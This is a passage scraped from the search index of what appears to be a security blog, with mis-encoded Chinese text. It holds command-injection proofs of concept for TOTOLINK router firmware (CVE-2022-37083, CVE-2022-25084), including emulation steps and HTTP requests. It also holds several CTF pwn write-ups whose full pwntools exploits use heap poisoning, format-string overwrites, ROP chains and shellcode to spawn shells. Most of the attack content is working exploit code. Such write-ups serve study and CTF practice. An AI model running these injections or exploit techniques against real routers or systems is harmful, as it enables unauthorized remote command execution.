&lt;p&gt;ËøêË°å‰ª•‰∏ãÂëΩ‰ª§ÊåÇËΩΩË∑ØÁî±Âô®Âπ∂ÂêØÂä®ÊúçÂä°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chroot ./squashfs-root/ /bin/sh 

/usr/sbin/lighttpd -f /lighttp/lighttpd.conf -m /lighttp/lib    #-mÊåáÂÆöÂä®ÊÄÅÈìæÊé•Â∫ìÊâÄÂú®Êñá‰ª∂Â§π
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1691499467495.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÊàêÂäüÂêØÂä®ÊúçÂä°ÂêéÈ™åËØÅ&lt;br&gt;
POC:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;POST /cgi-bin/cstecgi.cgi HTTP/1.1
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 26
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Host: 192.168.122.15
Origin: http://192.168.122.15
Proxy-Connection: keep-alive
Referer: http://192.168.122.15/login.html
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
X-Requested-With: XMLHttpRequest

{&amp;quot;ip&amp;quot;:&amp;quot;;ls;&amp;quot;,&amp;quot;topicurl&amp;quot;:&amp;quot;setDiagnosisCfg&amp;quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1691499526940.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
">CVE-2022-37083 Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/dvNDl3Egy/"" data-c="
          &lt;h3 id=&#34;Ê¶ÇËø∞&#34;&gt;&lt;strong&gt;Ê¶ÇËø∞&lt;/strong&gt;Ôºö&lt;/h3&gt;
&lt;p&gt;TOTOLINK T6_Firmware V5.9c.4085_B20190428Â≠òÂú®‰∏Ä‰∏™‰ªªÊÑèÂëΩ‰ª§ÊâßË°åÊºèÊ¥ûÔºå‰Ωç‰∫é&lt;code&gt;cgi-bin/downloadFlile.cgi&lt;/code&gt;‰∏≠&lt;br&gt;
&lt;a href=&#34;https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/190/ids/36.html&#34;&gt;‰∏ãËΩΩÈìæÊé•&lt;/a&gt;&lt;/p&gt;
&lt;h3 id=&#34;ÊºèÊ¥û&#34;&gt;&lt;strong&gt;ÊºèÊ¥û&lt;/strong&gt;Ôºö&lt;/h3&gt;
&lt;p&gt;ÊºèÊ¥ûÁÇπÂá∫Áé∞Âú®&lt;code&gt;cgi-bin/downloadFlile.cgi&lt;/code&gt;Á®ãÂ∫è‰∏≠mainÂáΩÊï∞‰∏≠&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691426998868.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Á®ãÂ∫èÈÄöËøáËé∑ÂèñËØ∑Ê±ÇÂèÇÊï∞Â∞ÜÂèÇÊï∞‰º†ÈÄíÁªôÂèòÈáè&lt;code&gt;v14&lt;/code&gt;Ôºå‰πãÂêéÂÜçÈÄöËøá&lt;code&gt;sprintf&lt;/code&gt;Â∞ÜÂèÇÊï∞Ê†ºÂºèÂåñÊãºÊé•Âú®ÂèòÈáè&lt;code&gt;v24&lt;/code&gt;Âêé&lt;br&gt;
Êú™Ë¢´ËøáÊª§ÁöÑ&lt;code&gt;v24&lt;/code&gt;‰º†ÂÖ•&lt;code&gt;system&lt;/code&gt;ÂáΩÊï∞ÔºåËøõËÄåÂØºËá¥‰ªªÊÑèÂëΩ‰ª§ÊâßË°å&lt;/p&gt;
&lt;h3 id=&#34;Â§çÁé∞&#34;&gt;&lt;strong&gt;Â§çÁé∞&lt;/strong&gt;Ôºö&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;binwalk -Me&lt;/code&gt;ÊèêÂèñÂõ∫‰ª∂ÂêéËøõÂÖ•&lt;code&gt;squashfs-root&lt;/code&gt;ÁõÆÂΩï‰∏ãÊâßË°å&lt;code&gt;readelf -h ./bin/busybox&lt;/code&gt;Êü•ÁúãÊû∂ÊûÑÁ≠âÁõ∏ÂÖ≥‰ø°ÊÅØ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ELF Â§¥Ôºö
  MagicÔºö  7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
  Á±ªÂà´:                              ELF32
  Êï∞ÊçÆ:                              2 Ë°•Á†ÅÔºåÂ∞èÁ´ØÂ∫è (little endian)
  Version:                           1 (current)
  OS/ABI:                            UNIX - System V
  ABI ÁâàÊú¨:                          0
  Á±ªÂûã:                              EXEC (ÂèØÊâßË°åÊñá‰ª∂)
  Á≥ªÁªüÊû∂ÊûÑ:                          MIPS R3000
  ÁâàÊú¨:                              0x1
  ÂÖ•Âè£ÁÇπÂú∞ÂùÄÔºö              0x403bc0
  Á®ãÂ∫èÂ§¥Ëµ∑ÁÇπÔºö              52 (bytes into file)
  Start of section headers:          0 (bytes into file)
  Ê†áÂøóÔºö             0x70001005, noreorder, cpic, o32, mips32r2
  Size of this header:               52 (bytes)
  Size of program headers:           32 (bytes)
  Number of program headers:         8
  Size of section headers:           0 (bytes)
  Number of section headers:         0
  Section header string table index: 0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Á°ÆÂÆö‰∏∫mipselÂêéÈááÁî®qemuÁöÑsystemÊ®°ÂºèÊ®°Êãü&lt;br&gt;
È¶ñÂÖàÈÖçÁΩÆÁΩëÁªúÔºåÂ∞Ü‰ª•‰∏ãÂÜÖÂÆπÂÜôÂÖ•Êñá‰ª∂ÂêésourceÂç≥ÂèØ&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo brctl addbr virbr2 # ÂàõÂª∫ÁΩëÊ°•
sudo ifconfig virbr2 192.168.122.1/24 up # ÈÖçÁΩÆÁΩëÊ°•IP
sudo tunctl -t tap2 # Ê∑ªÂä†ËôöÊãüÁΩëÂç°tap2
sudo ifconfig tap2 192.168.122.11/24 up # ÈÖçÁΩÆËôöÊãüÁΩëÂç°IP
sudo brctl addif virbr2 tap2 # ÈÖçÁΩÆËôöÊãüÁΩëÂç°‰∏éÁΩëÊ°•ËøûÊé•
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÊèêÂâç‰∏ãËΩΩÂ•ΩÈïúÂÉèÂíåËôöÊãüÁ£ÅÁõò&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;wget https://people.debian.org/~aurel32/qemu/mipsel/debian_wheezy_mipsel_standard.qcow2 &amp;amp;&amp;amp; wget https://people.debian.org/~aurel32/qemu/mipsel/vmlinux-3.2.0-4-4kc-malta
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÁÑ∂ÂêéÂêØÂä®ËôöÊãüÊú∫&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;sudo qemu-system-mipsel \
-M malta \
-cpu 24KEc \
-m 1G \
-object rng-random,id=rng0,filename=/dev/urandom -device virtio-rng-pci,rng=rng0 \
-kernel vmlinux-3.2.0-4-4kc-malta \
-hda debian_wheezy_mipsel_standard.qcow2 \
-append &amp;quot;root=/dev/sda1 console=tty0&amp;quot; \
-netdev tap,id=tapnet,ifname=tap2,script=no \
-device rtl8139,netdev=tapnet \
-nographic
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËôöÊãüÊú∫ÂêØÂä®ÊàêÂäüÂêéroot/rootËøõÂÖ•ÔºåÊ≠§Êó∂ÈÖçÁΩÆËôöÊãüÊú∫ÁΩëÁªú&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ifconfig eth0 192.168.122.15 up
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Êñπ‰æøËµ∑ËßÅÔºåÂÖàÂ∞Ü&lt;code&gt;lighttp/lighttpd.conf&lt;/code&gt;‰∏≠ÁöÑpid‰∏ÄË°åÊ≥®ÈáäÊéâÔºåÂêéÁª≠Â∞±‰∏çÁî®ÂçïÁã¨ÂàõÂª∫&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691427943479.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Ê≠§Êó∂ÈÄöËøá&lt;code&gt;scp -r squashfs-root/ root@192.168.122.15:/root/&lt;/code&gt;Â∞ÜÊñá‰ª∂Á≥ªÁªü‰º†ËæìÂà∞ËôöÊãüÊú∫‰∏ä&lt;br&gt;
Â¶ÇÊûúÊä•Èîô&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;scp: realpath /root/squashfs-root: No such file
scp: upload &amp;quot;/root/squashfs-root&amp;quot;: path canonicalization failed
scp: failed to upload directory squashfs-root to /root
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ËÆ∞ÂæóÂä†&lt;code&gt;-O&lt;/code&gt;Â∞±Ë°å‰∫Ü&lt;br&gt;
‰º†ËæìÂÆåÊàêÂêéÊåÇËΩΩË∑ØÁî±Âô®Á≥ªÁªüÂπ∂ÂêØÂä®webÊúçÂä°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;chroot ./squashfs-root/ /bin/sh 
/bin/lighttpd -f /lighttp/lighttpd.conf
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Ê≠§Êó∂ÈÅáÂà∞Êä•Èîô&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691428131035.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ÂàôÈúÄË¶ÅÊåáÂÆöÂä®ÊÄÅÈìæÊé•Â∫ìÔºåÂä†‰∏äÂêéÂèòÊàê&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;./bin/lighttpd -f ./lighttp/lighttpd.conf -m ./lighttp/lib
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ÂèØ‰ª•ÊàêÂäüÂêØÂä®ÊúçÂä°&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691428266952.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
POCÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;GET /cgi-bin/downloadFlile.cgi?cmd=`ls&amp;gt;../cmd4.txt` HTTP/1.1
Host: 192.168.122.15
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
If-None-Match: &amp;quot;-1779788291&amp;quot;
If-Modified-Since: Mon, 07 Aug 2023 14:09:36 GMT
Connection: close
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1691428986394.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691429278253.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">CVE-2022-25084 Â§çÁé∞</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/SmeektZkD/"" data-c="
          &lt;p&gt;glibc 2.27 3 1.4&lt;br&gt;
Ê≤°Êúâuaf&lt;br&gt;
add‰∏≠Â≠òÂú®ÈÄªËæëÊºèÊ¥ûÔºåÂàÜÈÖçÂ§ßÂ∞èÂ§ß‰∫é0x400Â†ÜÂùó‰∏çÊàêÂäüÔºåÂèØ‰ª•‰øÆÊîπeditÊó∂ÁöÑnbytesÂπ∂ËøîÂõûËèúÂçï&lt;br&gt;
ÂêéÁª≠ÂèØ‰ª•Ë∂äÁïåÂÜô&lt;br&gt;
addÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691215851632.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
editÔºö&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1691215971440.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;p&gt;expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./baige&amp;quot;)
# io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28702)
elf=ELF(&amp;quot;./baige&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size?\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content?\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size?\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content?\n&amp;quot;,cc)

def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(n))
    
# gdb.attach(io)
# pause()

for i in range(8):
    add(i,0x100,b&amp;quot;a&amp;quot;)

add(8,0x100,b&amp;quot;b&amp;quot;) #8

for i in range(8):
    delete(i)

for i in range(7):
    add(i,0x100,&amp;quot;d&amp;quot;)

add(0,0x10,b&amp;quot;a&amp;quot;)
show(0)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x131-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
add(0,0xe0,b&amp;quot;a&amp;quot;)

free_hook=leak_addr+libc.sym[b&amp;quot;__free_hook&amp;quot;]
shell=leak_addr+0x4f432

add(1,0x100,b&amp;quot;d&amp;quot;)
add(2,0x100,b&amp;quot;d&amp;quot;)
add(3,0x100,b&amp;quot;d&amp;quot;)
delete(3)
delete(2)

io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt;\n&amp;quot;,b&amp;quot;1&amp;quot;)
io.sendlineafter(b&amp;quot;idx?\n&amp;quot;,str(1))
io.sendlineafter(b&amp;quot;size?\n&amp;quot;,str(0x421))

edit(1,0x118,cyclic(0x108)+p64(0x101)+p64(free_hook))

add(4,0x100,b&amp;quot;q&amp;quot;)
add(5,0x100,b&amp;quot;q&amp;quot;)
edit(5,0x20,p64(shell))

delete(1)
    
io.interactive()

# 0x4f3d5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f432 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a41c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">[ÈïøÂÆâÊùØ 2021Â≠¶ÁîüÁªÑ]baige wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/mjK5Vthuj/"" data-c="
          &lt;p&gt;Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤‰ªªÊÑèÂú∞ÂùÄË¶ÜÁõñ&lt;br&gt;
glibc 2.31-9.7&lt;br&gt;
mainÂáΩÊï∞ËøîÂõûÂú∞ÂùÄÂíå&lt;code&gt;call sub_13F7&lt;/code&gt;Âè™Â∑Æ1Â≠óËäÇ&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1690885652464.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
Á¨¨‰∏ÄÊ¨°Âä´ÊåÅretÂà∞Ê≠§Â§ÑÂπ∂‰∏îÊ≥ÑÈú≤libc&lt;br&gt;
Á¨¨‰∫åÊ¨°Ë¶ÜÁõñretÂú∞ÂùÄÂÄº‰∏∫one_gadgetÂç≥ÂèØ&lt;br&gt;
Ê≥®ÊÑèÈöèÊú∫Êï∞ÊØè‰∏ÄÊ¨°ÈÉΩË¶ÅÈáçÊñ∞ÁîüÊàêÔºå‰∏çË¶ÅÂÜôÂú®ifÈáåÈù¢Ôºå‰∏çÁÑ∂Âá∫Èîô&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./service&amp;quot;)
io=remote(&amp;quot;node3.anna.nssctf.cn&amp;quot;,28642)
elf=ELF(&amp;quot;./service&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;./libc-2.31.so&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

# gdb.attach(io)
# pause()

io.sendafter(b&amp;quot;name:\n&amp;quot;,b&amp;quot;a&amp;quot;*0x109)
io.recvuntil(b&amp;quot;a&amp;quot;*0x109)
canary=u64(io.recv(7).rjust(8,b&amp;quot;\x00&amp;quot;))
stack_addr=u64(io.recv(6).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;canary: &amp;quot;+hex(canary))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

cs.srand(0x61616161)

def game():
    io.recvuntil(b&amp;quot;: \n&amp;quot;)
    num=cs.rand()%3
    if num==1:
        io.sendline(b&amp;quot;2&amp;quot;)
    if num==2:
        io.sendline(b&amp;quot;0&amp;quot;)
    if num==0:
        io.sendline(b&amp;quot;1&amp;quot;)

for i in range(100):
    game()

ret_addr=stack_addr-0x218

payload=&amp;quot;%{}c%{}$hhn.%9$p.&amp;quot;.format(0x3e,8).encode()+p64(ret_addr)
#ÂêëÂÅèÁßª‰∏∫8Â§ÑÂ≠òÂÇ®ret_addrÂπ∂Ë¶ÜÁõñret_addrÂú∞ÂùÄÂ§ÑÊï∞ÊçÆ‰ΩéÂ≠óËäÇ`\x43`‰∏∫`\x3e`‰ªéËÄåËøîÂõûvuln
#ÂêåÊó∂Ê≥ÑÈú≤libcÂú∞ÂùÄ

io.sendafter(b&amp;quot;you.\n&amp;quot;,payload)

io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(14),16)-175-libc.sym[b&amp;quot;printf&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))
shell=leak_addr+0xe3b31

payload=fmtstr_payload(6,{ret_addr:shell})
io.send(payload)
#‰øÆÊîπret_addr‰∏∫one_gadget

io.interactive()

# 0xe3b2e execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b31 execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b34 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL
&lt;/code&gt;&lt;/pre&gt;
">[ËôéÁ¨¶CTF 2022]babygame wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/nQxaOOZy1/"" data-c="
          &lt;h3 id=&#34;love&#34;&gt;love:&lt;/h3&gt;
&lt;p&gt;Ê†ºÂºèÂåñÂ≠óÁ¨¶‰∏≤Ê≥ÑÈú≤canaryÂíålibc&lt;br&gt;
ÂÆòÊñπÁªôÁöÑÊòØË¶ÜÁõñTLS‰∏äÁöÑcanaryÔºåÂõ†‰∏∫‰ΩøÁî®‰∫Ügets&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28310)
# io=process(&amp;quot;./pwn&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

# gdb.attach(io)
# pause()

pop_rdi=0x4013f3
ret=0x40101a

io.recvuntil(b&amp;quot;Toka\n\n&amp;quot;)
# payload=&amp;quot;%15$p.%17$p.%486c%9$n&amp;quot;  #520-18-14-2   
payload=&amp;quot;%520c%9$n.%15$p.%17$p&amp;quot;
io.send(payload)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;.&amp;quot;)
canary=int(io.recv(18),16)
io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(14),16)-libc.sym[b&amp;quot;__libc_start_main&amp;quot;]-243
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]
sh_addr=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))

print(&amp;quot;canary: &amp;quot;,hex(canary))
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

payload=cyclic(0x28)+p64(canary)+p64(0)+p64(ret)+p64(pop_rdi)+p64(sh_addr)+p64(sys_addr)
io.sendlineafter(b&amp;quot;vel\n\n&amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;rbp&#34;&gt;rbp:&lt;/h3&gt;
&lt;p&gt;Ê†àËøÅÁßª+orwÔºö&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./rbp&amp;quot;)
io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28341)
elf=ELF(&amp;quot;./rbp&amp;quot;)
libc=ELF(&amp;quot;./libc-2.31.so&amp;quot;)

pop_rdi=0x401353
leave_ret=0x40121d
read_text=0x401292
puts_got=elf.got[b&amp;quot;puts&amp;quot;]
puts_plt=elf.plt[b&amp;quot;puts&amp;quot;]

payload=cyclic(0x210)+p64(0x404910)+p64(read_text)
io.sendafter(b&amp;quot;try it\n&amp;quot;,payload)


payload=p64(0)+p64(pop_rdi)+p64(puts_got)+p64(puts_plt)+p64(0x401270)
payload=payload.ljust(0x210,b&amp;quot;a&amp;quot;)+p64(0x404910-0x210)+p64(leave_ret)
io.send(payload)

leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
pop_rsi=leak_addr+0x2601f
pop_rdx=leak_addr+0x142c92

# gdb.attach(io)
# pause()

payload=cyclic(0x210)+p64(0x404498)+p64(read_text)
io.sendafter(b&amp;quot;try it\n&amp;quot;,payload)

#open
orw=b&amp;quot;/flag\x00\x00\x00&amp;quot;+p64(pop_rdi)+p64(0x404288)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x404a00)+p64(pop_rdx)+p64(0x50)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x404a00)+p64(pop_rdx)+p64(0x50)+p64(write_a)

orw=orw.ljust(0x210,b&amp;quot;a&amp;quot;)+p64(0x404490-0x208)+p64(leave_ret)
io.send(orw)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;xor&#34;&gt;xorÔºö&lt;/h3&gt;
&lt;p&gt;Â≠òÂú®xorÊØèÊ¨°Âè™ËÉΩÂºÇÊàñ‰∏Ä‰∏™Â≠óËäÇÔºå‰ΩÜÊòØÊúÄÂºÄÂßãÊúâflagÂà§Êñ≠&lt;br&gt;
flagÂàùÂÄº‰∏∫0ÔºåÂáΩÊï∞ËøõÂÖ•Êù°‰ª∂Â∞è‰∫éÁ≠â‰∫é0&lt;br&gt;
ÈúÄË¶ÅÈÄöËøáÁ¨¨‰∏ÄÊ¨°ÂºÇÊàñÂ∞ÜflagÁöÑÁ¨¶Âè∑‰ΩçË¶ÜÁõñ‰∏∫0xffÂç≥ÂèØÁªïËøá&lt;br&gt;
ÂêéÈù¢ÂêërwxÊÆµÂÜôshellcodeÔºåÊúÄÂêéÂä´ÊåÅ&lt;code&gt;fini_array&lt;/code&gt;ÊåáÈíàÂà∞shellcodeÂ§ÑÂç≥ÂèØ&lt;br&gt;
expÔºö&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./pwn&amp;quot;)
io=remote(&amp;quot;node4.anna.nssctf.cn&amp;quot;,28981)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

def xorenc(addr,val):
    io.sendlineafter(b&amp;quot;addr: &amp;quot;,addr)
    io.sendlineafter(b&amp;quot;value: &amp;quot;,val)    

# gdb.attach(io)
# pause()

pop_rdi=0x2a3e5 
flag=0x600bcc
fini_array=0x600970
sc_addr=0x600d00  # xor 0x400610  20 0B10

xorenc(hex(flag+3).encode(),b&amp;quot;0xff&amp;quot;)
xorenc(hex(fini_array).encode(),b&amp;quot;0x10&amp;quot;)
xorenc(hex(fini_array+1).encode(),b&amp;quot;0x0b&amp;quot;)
xorenc(hex(fini_array+2).encode(),b&amp;quot;0x20&amp;quot;)

shellcode=asm(shellcraft.sh())
for i in range(len(shellcode)):
    xorenc(hex(sc_addr+i),hex(shellcode[i]).encode())

xorenc(hex(flag+3).encode(),b&amp;quot;0xff&amp;quot;) #trigger

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;read_file&#34;&gt;read_file:&lt;/h3&gt;
&lt;p&gt;Á¨¨‰∏ÄÊ¨°ËæìÂÖ•ËøúÁ´ØÈô§ÂéªÂê´&lt;code&gt;flag&lt;/code&gt;Â≠ó‰∏≤ÁöÑÊñá‰ª∂Âêç‰ΩøÂæó&lt;code&gt;file_flag&lt;/code&gt;‰∏∫Áúü‰ªéËÄåËÉΩËøõÂÖ•read_fileÂáΩÊï∞&lt;br&gt;
ËøúÁ´Ø&lt;code&gt;flag.txt&lt;/code&gt; 8Â≠óËäÇÂèØ‰ª•ËÆ©&lt;code&gt;file_fd&lt;/code&gt;Ë¶ÜÁõñ‰∏∫0Ôºå‰Ωøfd=0Ôºåread‰ªéÈîÆÁõòËæìÂÖ•&lt;br&gt;
read_fileÈáåÈù¢ËæìÂÖ•lengthÊó∂Ë∞ÉÁî®&lt;code&gt;alloca()&lt;/code&gt;Âú®Ê†à‰∏äÂàÜÈÖçÁ©∫Èó¥Ôºå‰ΩøÂæóÂêéÁª≠ÂèØ‰ª•Ê†àÊ∫¢Âá∫&lt;br&gt;
Ê≠§Êó∂file_name‰∏∫&lt;code&gt;flag.txt&lt;/code&gt;ÔºåÈÄöËøáload_fileÂáΩÊï∞Âä†‰∏äÂÅèÁßªÁõ¥Êé•Ë∑≥ËΩ¨Âà∞&lt;br&gt;
&lt;code&gt;file_fd = open(file_name, 0, 0LL);&lt;/code&gt;‰ªéËÄåÁªïËøá&lt;code&gt;flag&lt;/code&gt;Â≠ó‰∏≤Âà§Êñ≠&lt;br&gt;
Á¨¨‰∏Ä‰∏™&lt;code&gt;ret&lt;/code&gt;‰ΩøÂæóÁ®ãÂ∫èÊ≠£Â∏∏Ë∑≥ËΩ¨Âà∞ÊúÄread_fileÔºåÁ¨¨‰∫å‰∏™&lt;code&gt;ret&lt;/code&gt;Âπ≥Ë°°Ê†à&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=process(&amp;quot;./pwn&amp;quot;)
# io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28565)

